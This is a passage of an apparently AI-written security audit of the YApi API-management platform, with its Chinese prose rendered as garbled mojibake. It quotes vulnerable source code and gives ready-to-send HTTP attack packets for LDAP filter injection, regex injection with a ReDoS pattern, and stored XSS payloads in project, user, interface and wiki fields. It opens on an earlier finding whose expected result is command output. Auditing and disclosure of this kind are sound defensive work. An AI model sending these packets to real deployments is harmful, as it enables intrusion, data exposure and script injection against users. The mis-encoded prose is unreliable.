é¢„æœŸç»“æœï¼šå“åº” JSON ä¸­ `list[*].res_body` å­—æ®µåŒ…å«å‘½ä»¤è¾“å‡ºï¼ˆå¦‚ `uid=...` æˆ– Windows ç”¨æˆ·åï¼‰ã€‚

å›æ»šæ–¹å¼ï¼šå°†é¡¹ç›® `after_script` æ¸…ç©ºï¼Œå†æ¬¡è°ƒç”¨æ­¥éª¤2ã€‚

---

### ğŸ” **é˜¶æ®µä¸‰ï¼šæ³¨å…¥ç±»æ¼æ´æ·±åº¦å®¡è®¡** [è¿›è¡Œä¸­]
**å®¡è®¡èŒƒå›´**ï¼š
- SQLæ³¨å…¥ï¼ˆæ‰€æœ‰æ•°æ®åº“æ“ä½œç‚¹ï¼‰
- NoSQLæ³¨å…¥
- å‘½ä»¤æ³¨å…¥
- LDAPæ³¨å…¥
- æ¨¡æ¿æ³¨å…¥

**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] æšä¸¾æ‰€æœ‰æ•°æ®åº“æŸ¥è¯¢æ“ä½œç‚¹
- [x] è¯†åˆ«æ‰€æœ‰å‘½ä»¤æ‰§è¡Œå‡½æ•°è°ƒç”¨ç‚¹
- [x] åˆ†ææ‰€æœ‰æ¨¡æ¿æ¸²æŸ“ä½ç½®
- [x] ä¸ºæ¯ä¸ªæ¼æ´ç‚¹æ‰¾åˆ°æ‰€æœ‰å¯è§¦å‘çš„URLç«¯ç‚¹
- [x] ç”Ÿæˆæ¯ä¸ªç«¯ç‚¹çš„å®Œæ•´HTTPæ”»å‡»æ•°æ®åŒ…

---

#### æ•°æ®åº“æŸ¥è¯¢æ“ä½œç‚¹ï¼ˆå…¨é¢æšä¸¾ï¼‰
- è¯´æ˜ï¼šåç«¯ç»Ÿä¸€é€šè¿‡ Mongoose `model` åœ¨ `server/models/*` è¿›è¡Œ CRUDï¼Œæ§åˆ¶å™¨å±‚é€šè¿‡ `yapi.getInst(Model)` è°ƒç”¨ã€‚ä»¥ä¸‹æŒ‰æ¨¡å‹æ±‡æ€»ä¸»è¦æŸ¥è¯¢æ–¹æ³•ï¼ˆå«ç±»å‹ï¼‰ï¼Œå¹¶æ˜ å°„è‡³å¯¹åº”æ§åˆ¶å™¨ç«¯ç‚¹ã€‚

- userModelï¼ˆ`server/models/user.js`ï¼‰
  - è¯»å–ï¼š`find/ findOne/ findById/ findByEmail/ list/ listWithPaging/ listCount`
  - å†™å…¥ï¼š`save/ update/ del`
  - æœç´¢ï¼š`search(keyword)` ä½¿ç”¨æ­£åˆ™åŒ¹é…ç”¨æˆ·å/é‚®ç®±
  - è°ƒç”¨ç«¯ç‚¹ï¼š
    - `/api/user/login`ï¼ˆfindByEmailï¼‰
    - `/api/user/find`ï¼ˆfindByIdï¼‰
    - `/api/user/list`ï¼ˆlistWithPaging, listCountï¼‰
    - `/api/user/update`ï¼ˆupdate + è”åŠ¨ group/project æˆå‘˜ä¿¡æ¯ï¼‰
    - `/api/user/del`ï¼ˆdelï¼‰
    - `/api/user/search?q=`ï¼ˆsearchï¼‰

- projectModelï¼ˆ`server/models/project.js`ï¼‰
  - è¯»å–ï¼š`get/ getBaseInfo/ getByEnv/ list/ listWithPaging/ listCount/ countByGroupId/ getProjectListCount/ getAuthList/ getByDomain`
  - å†™å…¥ï¼š`save/ up(update)/ del/ delByGroupid/ addMember/ delMember/ changeMemberRole/ changeMemberEmailNotice/ upIndex`
  - ç»Ÿè®¡ï¼š`checkNameRepeat/ checkDomainRepeat/ countWithPublic/ checkMemberRepeat`
  - æœç´¢ï¼š`search(keyword)` é¡¹ç›®åæ­£åˆ™åŒ¹é…
  - è°ƒç”¨ç«¯ç‚¹ï¼ˆèŠ‚é€‰ï¼‰ï¼š
    - `/api/project/add|up|del|copy|list|get|get_env|get_member_list|add_member|del_member|change_member_role|change_member_email_notice|token|update_token|search`

- interfaceModelï¼ˆ`server/models/interface.js`ï¼‰
  - è¯»å–ï¼š`get/ getBaseinfo/ getByPath/ getByQueryPath/ getVar/ list/ listWithPage/ listByPid/ listByCatid/ listByCatidWithPage/ listByOptionWithPage/ listCount/ countByProjectId/ getInterfaceListCount/ getcustomFieldValue`
  - å†™å…¥ï¼š`save/ up(update)/ upEditUid/ upIndex/ del/ delByCatid/ delByProjectId`
  - æœç´¢ï¼š`search(keyword)` æŒ‰ `title/path` æ­£åˆ™
  - è°ƒç”¨ç«¯ç‚¹ï¼š
    - `/api/interface/add|save|up|del|get|list|list_cat|list_menu|getCatMenu|up_index` ç­‰

- groupModelï¼ˆ`server/models/group.js`ï¼‰
  - è¯»å–ï¼š`get/ getGroupById/ getByPrivateUid/ list/ getAuthList/ findByGroups/ checkMemberRepeat/ getGroupListCount`
  - å†™å…¥ï¼š`save/ up(update)/ addMember/ delMember/ changeMemberRole/ del`
  - æœç´¢ï¼š`search(keyword)` æŒ‰ `group_name` æ­£åˆ™
  - è°ƒç”¨ç«¯ç‚¹ï¼š
    - `/api/group/add|up|del|get|list|get_member_list|add_member|del_member|change_member_role`

- å…¶ä»–æ¨¡å‹ï¼ˆ`server/models/*`ï¼‰
  - tokenModelï¼š`get/ findId/ up`ï¼ˆ`/api/project/token|update_token`ï¼‰
  - followModelï¼š`save/ del/ list/ listByProjectId/ updateById`ï¼ˆ`/api/follow/*`ï¼‰
  - interfaceCol/interfaceCat/interfaceCaseï¼šé›†åˆ/åˆ†ç±»/ç”¨ä¾‹çš„ `save/get/list/up/del`ï¼ˆ`/api/col/*`ï¼‰
  - avatarModelï¼š`get/ up`ï¼ˆ`/api/user/avatar|upload_avatar`ï¼‰
  - storageModelï¼š`save/updateOne/get/del`ï¼ˆå†…éƒ¨å­˜å‚¨ï¼‰

è¯æ®ï¼ˆä½¿ç”¨ç”¨æˆ·è¾“å…¥æ„é€ æ­£åˆ™ï¼‰ï¼š

```99:111:server/models/user.js
search(keyword) {
  return this.model
    .find(
      {
        $or: [{ email: new RegExp(keyword, 'i') }, { username: new RegExp(keyword, 'i') }]
      },
      {
        passsalt: 0,
        password: 0
      }
    )
    .limit(10);
}
```

```297:303:server/models/project.js
search(keyword) {
  return this.model
    .find({
      name: new RegExp(keyword, 'ig')
    })
    .limit(10);
}
```

```340:349:server/models/interface.js
search(keyword) {
  return this.model
    .find({
      $or: [
        { 'title': new RegExp(keyword, 'ig') },
        { 'path': new RegExp(keyword, 'ig') }
      ]
    })
    .limit(10);
}
```

```202:208:server/models/group.js
search(keyword) {
  return this.model
    .find({
      group_name: new RegExp(keyword, 'i')
    })
    .limit(10);
}
```

---

#### æ¼æ´ä¸€ï¼šLDAP è¿‡æ»¤å™¨æ³¨å…¥ï¼ˆå·²ç¡®è®¤ï¼‰
- ä½ç½®ä¸æˆå› ï¼š`server/utils/ldap.js` æ„é€  LDAP `filter` æ—¶å°†ç”¨æˆ·å¯æ§çš„ç”¨æˆ·åç›´æ¥æ‹¼æ¥åˆ°è¿‡æ»¤è¡¨è¾¾å¼ï¼Œæœªåš RFC4515 å­—ç¬¦è½¬ä¹‰ã€‚

```113:126:server/utils/ldap.js
const searchDn = ldapLogin.searchDn;
const searchStandard = ldapLogin.searchStandard;
// å¤„ç†å¯ä»¥è‡ªå®šä¹‰filter
let customFilter;
if (/^(&|\|)/gi.test(searchStandard)) {
  customFilter = searchStandard.replace(/%s/g,username);
} else {
  customFilter = `${searchStandard}=${username}`;
}
const opts = {
  // filter: `(${searchStandard}=${username})`,
  filter: `(${customFilter})`,
  scope: 'sub'
};
```

- å½±å“ï¼šæ”»å‡»è€…å¯æ³¨å…¥ä»»æ„ LDAP æ¡ä»¶ï¼Œå¯¼è‡´ç”¨æˆ·æšä¸¾ä¸æŸ¥è¯¢é¢æ‰©å¤§ã€ä»¥åŠå¯¹ LDAP æœåŠ¡é€ æˆé«˜è´Ÿè½½ã€‚è®¤è¯æµç¨‹ä»éœ€äºŒæ¬¡ `bind(users[0].dn, password)` æ ¡éªŒå¯†ç ï¼Œå› æ­¤ä¸æ„æˆå£ä»¤ç»•è¿‡ã€‚
- å¯è§¦å‘ç«¯ç‚¹ï¼š
  - æœªæˆæƒï¼š`/api/user/login_by_ldap`ï¼ˆALLï¼‰

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆLDAP æ³¨å…¥ï¼‰ï¼š

```
POST /api/user/login_by_ldap HTTP/1.1
Host: target
Content-Type: application/json

{
  "email": "*)(|(uid=*))",
  "password": "invalid"
}
```

é¢„æœŸç»“æœï¼šåç«¯å‘ LDAP å‘é€çš„ filter å½¢å¦‚ `((mail=*)(|(uid=*)))` æˆ–ä¸è‡ªå®šä¹‰ `searchStandard` ç»„åˆåçš„ç­‰ä»·è¡¨è¾¾å¼ï¼Œè¿”å›é¦–ä¸ªç”¨æˆ·å¯¹è±¡ååœ¨äºŒæ¬¡ç»‘å®šå¤„æŠ¥â€œç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®â€ã€‚

ä¿®å¤å»ºè®®ï¼šå¯¹ç”¨æˆ·åæ‰§è¡Œ RFC4515 å­—ç¬¦è½¬ä¹‰ï¼ˆ`* ( ) \ NUL`ï¼‰ï¼Œå¹¶å¼ºåˆ¶ä»¥ç™½åå•æ¨¡æ¿ç”Ÿæˆ filterï¼Œç¦æ­¢ç›´æ¥æ ¼å¼åŒ–æ’å…¥ã€‚

---

#### æ¼æ´äºŒï¼šæ­£åˆ™è¡¨è¾¾å¼æ³¨å…¥ï¼ˆRegex Injectionï¼Œå·²ç¡®è®¤ï¼‰
- ä½ç½®ä¸æˆå› ï¼šå¤šå¤„æœç´¢ API ç›´æ¥ä»¥ç”¨æˆ·è¾“å…¥æ„é€  `new RegExp(keyword, 'i')`ï¼Œä»…æ‰§è¡Œäº†ä¸å……åˆ†çš„å…³é”®å­—ç¬¦æ ¡éªŒã€‚

```211:217:server/utils/commons.js
exports.validateSearchKeyword = keyword => {
  if (/^\*|\?|\+|\$|\^|\\|\.$/.test(keyword)) {
    return false;
  }
  return true;
};
```

- å½±å“ï¼š
  - æ„é€ ä»»æ„æ­£åˆ™å®ç°â€œå…¨é‡åŒ¹é…/å®½æ³›åŒ¹é…â€ï¼Œæ‰©å¤§æ•°æ®è¿”å›é¢ï¼ˆæ•°æ®æ³„éœ²é£é™©æå‡ï¼‰ã€‚
  - å¯æ„é€ å¤æ‚å›æº¯æ­£åˆ™å¯¼è‡´æ•°æ®åº“/Node çº¿ç¨‹é«˜ CPUï¼ˆæ€§èƒ½é€€åŒ–ï¼‰ã€‚

- å¯è§¦å‘ç«¯ç‚¹ï¼ˆå‡éœ€ç™»å½•æ€ Cookieï¼‰ï¼š
  - GET `/api/user/search?q=`ï¼ˆç”¨æˆ·å/é‚®ç®±æ­£åˆ™ï¼‰
  - GET `/api/project/search?q=`ï¼ˆé¡¹ç›®/åˆ†ç»„/æ¥å£æ­£åˆ™æ±‡æ€»ï¼‰

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆæ•°æ®é¢æ‰©å¤§ï¼šå…¨é‡åŒ¹é…ï¼‰ï¼š

```
GET /api/user/search?q=.%2a HTTP/1.1
Host: target
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>
```

```
GET /api/project/search?q=.%2a HTTP/1.1
Host: target
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>
```

å¯å¤ç° HTTP æ•°æ®åŒ…ï¼ˆæ€§èƒ½é€€åŒ–ç¤ºä¾‹ï¼‰ï¼š

```
GET /api/project/search?q=(a|aa)*b HTTP/1.1
Host: target
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>
```

é¢„æœŸç»“æœï¼šè¯·æ±‚è¿”å›æ—¶é—´æ˜¾è‘—ä¸Šå‡æˆ–æœç´¢ç»“æœæ— é™æ‰©å¤§ï¼ˆ`. *`ï¼‰ã€‚

ä¿®å¤å»ºè®®ï¼šå¯¹å…³é”®å­—æ‰§è¡Œä¸¥æ ¼è½¬ä¹‰ä¸ºå­—é¢é‡ï¼ˆä¾‹å¦‚ä½¿ç”¨ `new RegExp(_.escapeRegExp(keyword))`ï¼‰ï¼Œæˆ–ä»…å…è®¸å‰/åç¼€é€šé…è€Œéä»»æ„æ­£åˆ™ã€‚

---

#### NoSQL æ³¨å…¥å®¡è®¡ç»“è®º
- ç»“è®ºï¼šæœªå‘ç°ç›´æ¥å°†ç”¨æˆ·å¯¹è±¡åŸæ ·ä½œä¸ºæŸ¥è¯¢æ¡ä»¶ä¼ å…¥çš„åœºæ™¯ï¼›æ§åˆ¶å™¨æ™®éé€šè¿‡ `handleParams` åšç±»å‹çº¦æŸä¸æ¸…æ´—ï¼Œæ¨¡å‹å±‚æŒ‰å­—æ®µæ„é€ æŸ¥è¯¢ï¼Œæœªå‡ºç° `$where/$ne/$gt` ç­‰æ“ä½œç¬¦å¤–ä¼ ã€‚

```339:361:server/utils/commons.js
exports.handleParams = (params, keys) => {
  if (!params || typeof params !== 'object' || !keys || typeof keys !== 'object') {
    return false;
  }
  for (var key in keys) {
    var filter = keys[key];
    if (params[key]) {
      switch (filter) {
        case 'string':
          params[key] = trim(params[key] + '');
          break;
        case 'number':
          params[key] = !isNaN(params[key]) ? parseInt(params[key], 10) : 0;
          break;
        default:
          params[key] = trim(params + '');
      }
    }
  }
  return params;
};
```

---

#### å‘½ä»¤æ³¨å…¥ä¸æ¨¡æ¿æ³¨å…¥å®¡è®¡ç»“è®º
- å‘½ä»¤æ³¨å…¥ï¼šæœªå‘ç°æœåŠ¡ç«¯ `child_process.exec/execFile/spawn` ç­‰å‘½ä»¤æ‰§è¡Œ API çš„ä½¿ç”¨ç‚¹ã€‚
- æ¨¡æ¿æ³¨å…¥ï¼šåç«¯æœªä½¿ç”¨æœåŠ¡ç«¯æ¨¡æ¿å¼•æ“æ¸²æŸ“é¡µé¢ï¼›æ¥å£ç»Ÿä¸€è¿”å› JSONã€‚Mock/æ–­è¨€è„šæœ¬æ‰§è¡Œå·²ä½¿ç”¨ `safeify` æ²™ç®±ï¼ˆè§é˜¶æ®µäºŒï¼‰ã€‚


### ğŸŒ **é˜¶æ®µå››ï¼šXSSæ¼æ´å…¨é¢æ‰«æ** [è¿›è¡Œä¸­]
**å®¡è®¡èŒƒå›´**ï¼š
- åå°„å‹XSS
- å­˜å‚¨å‹XSS  
- DOMå‹XSS

**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] è¯†åˆ«æ‰€æœ‰ç”¨æˆ·è¾“å…¥è¾“å‡ºç‚¹
- [x] åˆ†æå‰ç«¯æ¸²æŸ“æœºåˆ¶
- [x] æ£€æŸ¥æ‰€æœ‰æ•°æ®å­˜å‚¨å’Œæ£€ç´¢ç‚¹
- [x] æšä¸¾æ‰€æœ‰å¯è§¦å‘XSSçš„URLå’Œå‚æ•°
- [x] æä¾›å®Œæ•´çš„æ”»å‡»HTTPæ•°æ®åŒ…

---

#### å‘ç°ä¸€ï¼šå­˜å‚¨å‹XSS - é¡¹ç›®/åˆ†ç»„/æ¥å£åŠ¨æ€æ—¥å¿—ï¼ˆTimeLineï¼‰
- å‰ç«¯è¯æ®ï¼šåŠ¨æ€æ—¶é—´çº¿ç›´æ¥ä»¥ `dangerouslySetInnerHTML` æ¸²æŸ“æœåŠ¡ç«¯è¿”å›çš„ `item.content`ï¼ˆHTMLï¼‰ï¼Œæœªåšä»»ä½•è½¬ä¹‰/å‡€åŒ–ã€‚

```191:199:client/components/TimeLine/TimeLine.js
            <div className="logMesHeade">
              <span className="logoTimeago">{timeago(item.add_time)}</span>
              <span className="logtype">{logType[item.type]}åŠ¨æ€</span>
              <span className="logtime">{formatTime(item.add_time)}</span>
            </div>
            <span className="logcontent" dangerouslySetInnerHTML={{ __html: item.content }} />
```

- æœåŠ¡ç«¯è¯æ®ï¼šå¤šå¤„æ—¥å¿—å†…å®¹æ‹¼æ¥HTMLæ—¶ç›´æ¥æ³¨å…¥ç”¨æˆ·å¯æ§å­—æ®µï¼šç”¨æˆ·åã€é¡¹ç›®åã€åˆ†ç»„åã€åˆ†ç±»åã€æ¥å£åã€ç”¨ä¾‹åç­‰ã€‚

ç¤ºä¾‹1ï¼ˆé¡¹ç›®åˆ›å»ºæ—¶å†™å…¥æ—¥å¿—ï¼Œé¡¹ç›®åå¯æ§ï¼‰ï¼š

```252:260:server/controllers/project.js
yapi.commons.saveLog({
  content: `<a href="/user/profile/${this.getUid()}">${username}</a> æ·»åŠ äº†é¡¹ç›® <a href="/project/${
    result._id
  }">${params.name}</a>`,
  type: 'project',
  uid,
  username: username,
  typeid: result._id
});
```

ç¤ºä¾‹2ï¼ˆé¡¹ç›®æ·»åŠ æˆå‘˜ï¼Œæˆå‘˜ç”¨æˆ·åå¯æ§ï¼‰ï¼š

```418:427:server/controllers/project.js
if (add_members.length) {
  let members = add_members.map(item => {
    return `<a href = "/user/profile/${item.uid}">${item.username}</a>`;
  });
  members = members.join('ã€');
  let username = this.getUsername();
  yapi.commons.saveLog({
    content: `<a href="/user/profile/${this.getUid()}">${username}</a> æ·»åŠ äº†é¡¹ç›®æˆå‘˜ ${members}`,
    type: 'project',
    uid: this.getUid(),
    username: username,
    typeid: params.id
  });
}
```

ç¤ºä¾‹3ï¼ˆæ¥å£æ–°å¢ï¼Œæ¥å£åå¯æ§ï¼‰ï¼š

```284:296:server/controllers/interface.js
let title = `<a href="/user/profile/${this.getUid()}">${username}</a> ä¸ºåˆ†ç±» <a href="/project/${
  params.project_id
}/interface/api/cat_${params.catid}">${cate.name}</a> æ·»åŠ äº†æ¥å£ <a href="/project/${
  params.project_id
}/interface/api/${result._id}">${data.title}</a> `;

yapi.commons.saveLog({
  content: title,
  type: 'project',
  uid: this.getUid(),
  username: username,
  typeid: params.project_id
});
```

ç¤ºä¾‹4ï¼ˆåˆ†ç»„æ“ä½œï¼Œåˆ†ç»„å/æˆå‘˜ç”¨æˆ·åå¯æ§ï¼‰ï¼š

```180:186:server/controllers/group.js
yapi.commons.saveLog({
  content: `<a href="/user/profile/${this.getUid()}">${username}</a> æ–°å¢äº†åˆ†ç»„ <a href="/group/${
    result._id
  }">${params.group_name}</a>`,
  type: 'group',
  uid: this.getUid(),
  username: username,
  typeid: result._id
});
```

- å—å½±å“ç«¯ç‚¹ï¼ˆä¼šç”Ÿæˆå«å¯æ§å­—æ®µçš„æ—¥å¿—HTMLï¼Œå‰ç«¯ç›´æ¥æ¸²æŸ“ï¼‰ï¼š
  - é¡¹ç›®ï¼š
    - POST `/api/project/add`ï¼ˆé¡¹ç›®å `name` æ³¨å…¥ï¼‰
    - POST `/api/project/up`ï¼ˆé¡¹ç›®å `name` æ³¨å…¥ï¼‰
    - POST `/api/project/add_member`ï¼ˆæˆå‘˜ `username` æ³¨å…¥ï¼‰
    - POST `/api/project/del_member`ï¼ˆæˆå‘˜ `username` æ³¨å…¥ï¼‰
    - POST `/api/project/change_member_role`ï¼ˆæˆå‘˜ `username` æ³¨å…¥ï¼‰
    - POST `/api/project/up_env`ã€POST `/api/project/up_tag`ï¼ˆé¡¹ç›®åæ˜¾ç¤ºï¼‰
  - åˆ†ç»„ï¼š
    - POST `/api/group/add|up`ï¼ˆåˆ†ç»„å `group_name` æ³¨å…¥ï¼‰
    - POST `/api/group/add_member|change_member_role|del_member`ï¼ˆæˆå‘˜ `username` æ³¨å…¥ï¼‰
  - æ¥å£/åˆ†ç±»/ç”¨ä¾‹ï¼š
    - POST `/api/interface/add|up|del`ï¼ˆæ¥å£å `title` æ³¨å…¥ï¼‰
    - POST `/api/interface/add_cat|up_cat|del_cat`ï¼ˆåˆ†ç±»å `name` æ³¨å…¥ï¼‰
    - POST `/api/col/add_col|up_col|add_case|up_case|del_case`ï¼ˆé›†åˆå/ç”¨ä¾‹åæ³¨å…¥ï¼‰

å¯å¤ç°HTTPæ•°æ®åŒ…ï¼ˆç¤ºä¾‹Aï¼šé¡¹ç›®åæ³¨å…¥ â†’ é¡¹ç›®åŠ¨æ€é¡µè§¦å‘ï¼‰ï¼š

```
POST /api/project/add HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

{
  "name": "<img src=x onerror=alert(document.domain)>",
  "basepath": "/api",
  "group_id": <GROUP_ID>,
  "group_name": "G",
  "project_type": "private"
}
```

```
GET /api/log/list?type=project&typeid=<PROJECT_ID>&page=1&limit=10 HTTP/1.1
Host: target
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>
```

å¯å¤ç°HTTPæ•°æ®åŒ…ï¼ˆç¤ºä¾‹Bï¼šç”¨æˆ·åæ³¨å…¥ â†’ ä»»æ„äº§ç”Ÿä¸€æ¡é¡¹ç›®åŠ¨æ€åè§¦å‘ï¼‰ï¼š

```
POST /api/user/update HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

{
  "uid": <UID>,
  "username": "<svg onload=alert(document.domain)>"
}
```

éšåæ‰§è¡Œä»»æ„ä¼šå†™æ—¥å¿—çš„æ“ä½œï¼ˆå¦‚æ›´æ–°é¡¹ç›®åï¼‰ï¼š

```
POST /api/project/up HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

{
  "id": <PROJECT_ID>,
  "name": "safe"
}
```

é¢„æœŸç»“æœï¼šé¡¹ç›®åŠ¨æ€æ—¶é—´çº¿æˆ–åˆ†ç»„åŠ¨æ€é¡µæ¸²æŸ“æ—¥å¿—æ—¶ç«‹å³æ‰§è¡Œ XSSã€‚

---

#### å‘ç°äºŒï¼šå­˜å‚¨å‹XSS - æ¥å£å¤‡æ³¨ `desc`
- å‰ç«¯è¯æ®ï¼šæ¥å£è¯¦æƒ…é¡µç›´æ¥ä»¥ `dangerouslySetInnerHTML` æ¸²æŸ“ `desc`ã€‚

```496:503:client/containers/Project/Interface/InterfaceList/View.js
{this.props.curData.desc && (
  <div
    className="tui-editor-contents"
    style={{ margin: '0px', padding: '0px 20px', float: 'none' }}
    dangerouslySetInnerHTML={{ __html: this.props.curData.desc }}
  />
)}
```

- å­˜å‚¨ç‚¹ï¼šæ¥å£ä¿å­˜/æ›´æ–°æ—¶ç›´æ¥æ¥æ”¶å¯Œæ–‡æœ¬HTMLã€‚

```236:239:client/containers/Project/Interface/InterfaceList/InterfaceEditForm.js
if (!err) {
  values.desc = this.editor.getHtml();
  values.markdown = this.editor.getMarkdown();
}
```

å¯å¤ç°HTTPæ•°æ®åŒ…ï¼ˆæ›´æ–°æ¥å£å¤‡æ³¨æ³¨å…¥ï¼‰ï¼š

```
POST /api/interface/up HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

{
  "id": <INTERFACE_ID>,
  "desc": "<img src=1 onerror=alert(1)>",
  "message": "update"
}
```

è®¿é—®æ¥å£è¯¦æƒ…é¡µå³å¯è§¦å‘ã€‚

---

#### å‘ç°ä¸‰ï¼šå­˜å‚¨å‹XSS - Wiki æè¿° `desc`
- å‰ç«¯è¯æ®ï¼šWiki å±•ç¤ºé¡µä»¥ `dangerouslySetInnerHTML` æ¸²æŸ“ `desc`ã€‚

```24:27:exts/yapi-plugin-wiki/wikiPage/View.js
<div
  className="tui-editor-contents"
  dangerouslySetInnerHTML={{ __html: desc }}
/>
```

- å­˜å‚¨ç‚¹ï¼šWiki æ¥å£ç›´æ¥ä¿å­˜HTMLã€‚

```49:58:exts/yapi-plugin-wiki/controller.js
let params = ctx.request.body;
params = yapi.commons.handleParams(params, {
  project_id: 'number',
  desc: 'string',
  markdown: 'string'
});
```

å¯å¤ç°HTTPæ•°æ®åŒ…ï¼š

```
POST /api/plugin/wiki_desc/up HTTP/1.1
Host: target
Content-Type: application/json
Cookie: _yapi_uid=<UID>; _yapi_token=<JWT>

{
  "project_id": <PROJECT_ID>,
  "desc": "<svg onload=alert(1)>",
  "markdown": "<p>x</p>",
  "email_notice": false
}
```

è®¿é—® `/project/<PROJECT_ID>/wiki` å³è§¦å‘ã€‚

---

#### åå°„å‹XSSå®¡è®¡ç»“è®º
- æœªå‘ç°ä»URLå‚æ•°ç›´æ¥åå°„åˆ°HTMLçš„æ¸²æŸ“ç‚¹ï¼›å‰ç«¯ä½¿ç”¨Reacté»˜è®¤è½¬ä¹‰ï¼Œæœªæ£€å‡º `innerHTML =` è¿™ç±»DOMæ‹¼æ¥ã€‚åŠ¨æ€HTMLæ¸²æŸ“å‡æ¥è‡ªå·²å­˜å‚¨çš„å­—æ®µæˆ–æœåŠ¡ç«¯ç”Ÿæˆçš„å·®å¼‚HTMLã€‚

#### DOMå‹XSSå®¡è®¡ç»“è®º
- æœªå‘ç°å±é™©çš„å‰ç«¯ `eval/new Function/document.write` ç­‰å¯¹æ¥æºäºURL/æ¶ˆæ¯çš„æ‰§è¡Œï¼›`window.location.hash` ä»…ç”¨äºèœå•çŠ¶æ€è®¡ç®—ï¼Œæœªå‚ä¸HTMLæ‹¼æ¥æˆ–è„šæœ¬æ‰§è¡Œã€‚

#### ä¿®å¤å»ºè®®
- å¯¹æ‰€æœ‰å«HTMLçš„å¯å­˜å‚¨å­—æ®µç»Ÿä¸€è¿›è¡ŒæœåŠ¡ç«¯å‡€åŒ–ï¼ˆå¦‚ `sanitize-html` ç™½åå•ç­–ç•¥ï¼‰ï¼Œæˆ–åœ¨å‰ç«¯æ¸²æŸ“å¤„å¼•å…¥ `DOMPurify` ä¸¥æ ¼è¿‡æ»¤åå†ä¼ ç»™ `dangerouslySetInnerHTML`ã€‚
- æ—¥å¿—ç³»ç»Ÿï¼ˆTimeLineï¼‰æ”¹ä¸ºä»…å…è®¸å—æ§ç‰‡æ®µï¼ˆå®‰å…¨çš„ `<a>` æ¨¡æ¿+è½¬ä¹‰åçš„æ–‡æœ¬ï¼‰ï¼Œå¯¹å˜é‡ç»Ÿä¸€HTMLè½¬ä¹‰åæ’å…¥ï¼›æˆ–å°†æ—¥å¿—æ”¹ä¸ºç»“æ„åŒ–æ•°æ®ï¼Œç”±å‰ç«¯å®‰å…¨æ¸²æŸ“ã€‚
- æ¥å£/Wiki å¤‡æ³¨å¯ä¿ç•™æœ‰é™HTMLæ ‡ç­¾ï¼ˆç²—ä½“ã€æ–œä½“ã€é“¾æ¥ã€ä»£ç ç­‰ï¼‰ï¼Œå…¶ä½™å…¨éƒ¨ç§»é™¤/è½¬ä¹‰ã€‚

### ğŸ” **é˜¶æ®µäº”ï¼šè®¤è¯ä¸ä¼šè¯å®‰å…¨å®¡è®¡** [å·²å®Œæˆ]
**å®¡è®¡èŒƒå›´**ï¼š
- å¼±å¯†ç ç­–ç•¥
- ä¼šè¯å›ºå®š
- æœªæˆæƒè®¿é—®
- æš´åŠ›ç ´è§£æ¼æ´
- JWTå®‰å…¨é—®é¢˜

**ä»»åŠ¡è¦æ±‚**ï¼š
- [x] åˆ†æè®¤è¯æµç¨‹æ‰€æœ‰ç¯èŠ‚
- [x] æ£€æŸ¥ä¼šè¯ç®¡ç†æœºåˆ¶
- [x] éªŒè¯æƒé™éªŒè¯å®Œæ•´æ€§
- [x] æšä¸¾æ‰€æœ‰å¯èƒ½ç»•è¿‡è®¤è¯çš„ç«¯ç‚¹

---

#### è®¤è¯/ä¼šè¯æµç¨‹æšä¸¾ï¼ˆä»£ç è¯æ®ï¼‰
- Cookie æŒä¹…åŒ– 7 å¤©ï¼Œ`_yapi_token` ä¸º JWTï¼Œå¯†é’¥ä¸ºç”¨æˆ·ç§ç› `passsalt`ï¼›åŒæ—¶å‘æ”¾ `_yapi_uid`ï¼š

```274:283:server/controllers/user.js
  setLoginCookie(uid, passsalt) {
    let token = jwt.sign({ uid: uid }, passsalt, { expiresIn: '7 days' });

    this.ctx.cookies.set('_yapi_token', token, {
      expires: yapi.commons.expireDate(7),
      httpOnly: true
    });
    this.ctx.cookies.set('_yapi_uid', uid, {
      expires: yapi.commons.expireDate(7),
      httpOnly: true
    });
  }
```

- æœåŠ¡ç«¯é‰´æƒï¼šè¯»å–ä¸¤æš Cookieï¼ŒæŒ‰ `_yapi_uid` æŸ¥è¯¢ç”¨æˆ·ï¼Œä½¿ç”¨è¯¥ç”¨æˆ· `passsalt` éªŒè¯ JWTï¼›æ ¡éªŒé€šè¿‡åè®¾ç½®ç™»å½•æ€ï¼š

```126:153:server/controllers/base.js
  async checkLogin(ctx) {
    let token = ctx.cookies.get('_yapi_token');
    let uid = ctx.cookies.get('_yapi_uid');
    try {
      if (!token || !uid) {
        return false;
      }
      let userInst = yapi.getInst(userModel);
      let result = await userInst.findById(uid);
      if (!result) {
        return false;
      }
      let decoded;
      try {
        decoded = jwt.verify(token, result.passsalt);
      } catch (err) {
        return false;
      }
      if (decoded.uid == uid) {
        this.$uid = uid;
        this.$auth = true;
        this.$user = result;
        return true;
      }
      return false;
    } catch (e) {
      yapi.commons.log(e, 'error');
      return false;
    }
  }
```

- OpenAPI Tokenï¼ˆéç™»å½•æ€ï¼‰ï¼š`token` å‚æ•°ä¸º `AES-192(passsalt)` åŠ å¯†çš„ `uid|projectToken`ï¼ŒæœåŠ¡ç«¯è§£å¯†å¹¶æ³¨å…¥ `ctx.params.project_id`ï¼Œè®¾ç½® `$tokenAuth=true`ï¼š

```44:63:server/utils/token.js
exports.getToken = function getToken(token, uid){
  if(!token)throw new Error('token ä¸èƒ½ä¸ºç©º')
  yapi.WEBCONFIG.passsalt = yapi.WEBCONFIG.passsalt || defaultSalt;
  return aseEncode(uid + '|' + token, yapi.WEBCONFIG.passsalt)
}

exports.parseToken = function parseToken(token){
  if(!token)throw new Error('token ä¸èƒ½ä¸ºç©º')
  yapi.WEBCONFIG.passsalt = yapi.WEBCONFIG.passsalt || defaultSalt;
  let tokens;
  try{
    tokens = aseDecode(token, yapi.WEBCONFIG.passsalt)
  }catch(e){}  
